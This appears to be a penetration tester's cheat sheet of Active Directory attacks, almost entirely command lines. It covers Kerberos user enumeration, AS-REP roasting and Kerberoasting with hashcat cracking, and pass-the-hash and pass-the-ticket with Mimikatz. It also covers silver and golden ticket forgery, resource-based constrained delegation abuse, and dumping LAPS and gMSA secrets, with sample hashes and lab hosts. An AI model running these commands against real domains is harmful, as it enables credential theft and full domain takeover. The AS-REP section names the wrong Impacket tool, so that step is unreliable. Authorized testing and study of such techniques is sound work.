# AD Attacks

### Kerbero Brute-Force

```bash
# No creds, brute-force usernames over Kerberos (port 88)
kerbrute userenum --dc <dc_ip> -d <domain> usernames.txt

# Alternate method using Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=users.txt <target_ip>
```

**Why:** Identify valid usernames when you don’t have any credentials.

***

### ASREPRoasting

```bash
# Users with DONTREQPREAUTH can be roasted without creds
sudo impacket-GetUserSPNs -request -dc-ip 10.10.10.191 test.com/dhawan


# Crack the hashes
hashcat -m 18200 hash.txt wordlist.txt
```

**Why:** Exploit accounts with no pre-auth to extract crackable hashes.

***

### Kerberoasting

<pre class="language-powershell"><code class="lang-powershell">#  Importing PowerView to memory
Import-Module .\PowerView.ps1

# Obtaining domain information
Get-NetDomain

# Querying user in the domain
Get-NetUser

# Querying user using select command
Get-NetUser | select cn

# Find SPN users
<strong>Get-NetUser -SPN
</strong># Get-netuser svc_mssql
# If We see SPN here! which indicates kerberoasting!

# Performing Kerberoasting attack using Rubius
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
Rubeus.exe kerberoast

# Or use Impacket
<strong>Impacket-GetUserSPNs &#x3C;domain>/&#x3C;user>:&#x3C;pass>@&#x3C;dc_ip>
</strong><strong># sudo impacket-GetUserSPNs -request -dc-ip 10.10.10.191 test.com/'sql_svc'
</strong>
# Crack
hashcat -m 13100 hash.txt wordlist.txt
</code></pre>

**Why:** Request TGS tickets for SPNs and extract service account hashes.

***

### Pass-the-Key (Overpass-the-Hash)

```powershell
# Pass NTLM hash to get TGT
# --- Mimikatz command ---
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
# sekurlsa::pth /user:dhawan /domain:test.com /ntlm:12f3g4uyf1234f1248bf6e93364cc93075 /run:powershell
```

**Why:** Use NTLM hash to request TGT—login without knowing password.

***

### Pass-the-Ticket

```powershell
# Inject TGT or TGS ticket
kerberos::ptt <ticket.kirbi>
# kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

# spin up admin powershell and start mimikartz
privilege::debug

#  Exporting Kerberos TGT/TGS to disk
sekurlsa::tickets /export

```

**Why:** Use harvested `.kirbi` ticket to impersonate users.

***

### Silver Ticket

Using impacket

<pre class="language-bash"><code class="lang-bash"># First thing first, We'll need to finx Skewed clock before attemping to get silver ticke
sudo timedatectl set-ntp off
<strong>rdate -n [IP of Target]
</strong>
Impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :51e4932f13712047027300f869d07ab6
<strong>
</strong><strong># All you need is 
</strong><strong>- Sevice SPN
</strong><strong>- Service credentials
</strong><strong>- misconfigured service which can impersinate other user
</strong><strong>    - Can be verified by running bloodhound
</strong><strong>
</strong></code></pre>

Injecting Silver ticket into Env

```bash
export KRB5CCNAME=Administrator.ccache
echo "$ip dc.intelligence.htb" | sudo tee -a /etc/hosts

# Logging into machine using silver ticket from Kali
impacket-wmiexec -k -no-pass dc.intelligence.htb
```

{% hint style="info" %}
`-k` Use Kerberos authentication. Grab credentials from ccache file (KRB5CCNAME) based on the target parameter
{% endhint %}



```powershell
# Forge service-specific TGS ticket
kerberos::golden /sid:<domain_sid> /user:<user> /rc4:<hash> /service:<spn> /target:<fqdn> /ptt
```

**Why:** Access services directly by forging a valid TGS (no contact with DC).

***

### Golden Ticket

<pre class="language-powershell"><code class="lang-powershell"># Forge TGT using krbtgt hash
<strong>kerberos::golden /user:Administrator /domain:&#x3C;domain> /sid:&#x3C;sid> /krbtgt:&#x3C;hash> /ptt
</strong><strong>
</strong># kerberos::golden /sid:S-1-5-21-asdfsdafasfasf-3766213998-138799841 /domain:test.com /ptt /target:dhawan.test.com /service:http /rc4:1232432434534tdfdfgertgerf/user:dhawan

# check if the tickt is injected into memory
iwr -UseDefaultCredentials http://web02.dhawan.test.com

</code></pre>

**Why:** Full domain compromise. Forge any TGT—unlimited access.

***

### RBCD (Resource-based Constrained Delegation)

```powershell
# Abuse msDS-AllowedToActOnBehalfOfOtherIdentity ACL
# 1. Create new machine account with addcomputer.py
# 2. Set RBCD ACL using PowerView or genericwrite

impacket-addcomputer -dc-ip <ip> -computer-name <name> -computer-pass <pass> -domain <domain>
# impacket-addcomputer local.test/r.dhawan -dc-ip 192.168.191.12 -hashes :19a3a7550ce8c505c2d46basdfsadffa8 -computer-name 'ATTACK$' -computer-pass 'DHWANPC1!'


rbcd.py -u user -p pass -dc-ip <ip> -target-computer <victim> -delegate-to <new_machine>
# python3 rbcd.py -dc-ip 192.168.191.12 -t LocalDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46basdfsadffa8 local.test\\r.dhawan

# confirming that this was added
Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-


# now let's get admin ticket
impacket-getST -spn cifs/dc.local.test local.test/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.191.12


# imperonating as Administrator using Silver ticket
sudo impacket-psexec -k -no-pass dc.local.test -dc-ip 192.168.191.12
```

{% hint style="warning" %}
With this account added, we now need a python script to help us manage the delegation rights. Let’s grab a copy of [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) and use it to set `msDS-AllowedToActOnBehalfOfOtherIdentity` on our new machine account.
{% endhint %}

**Why:** Lateral to high-value target via impersonation through delegation abuse.

***

### Misconfigured LAPS

```powershell
# Retrieve LAPS password from AD attribute
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | ft Name,ms-Mcs-AdmPwd

# Get-adcomputer localdc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-

```

**Why:** Extract cleartext local admin passwords if user has read access.

***

### gMSA Password Extraction

refer tool -> [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

```bash
python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
>
 > DC$
 > itsupport
svc_int$:::51e4932f13712047027300f869d07ab6
svc_int$:aes256-cts-hmac-sha1-96:285962204a4f54a092182cc51512bda5137de5b33becfd27797d079ba440e6d5
svc_int$:aes128-cts-hmac-sha1-96:cc50179e1ce82827a22ef0ad4fab3bd9


```

```powershell
# List gMSA accounts
Get-ADServiceAccount -Filter *

# Extract gMSA secret with DSInternals
Get-ADServiceAccount -Filter * | Get-ADReplAccount -Server <dc> | Format-List
```

**Why:** Extract machine-managed service account secrets used by services.
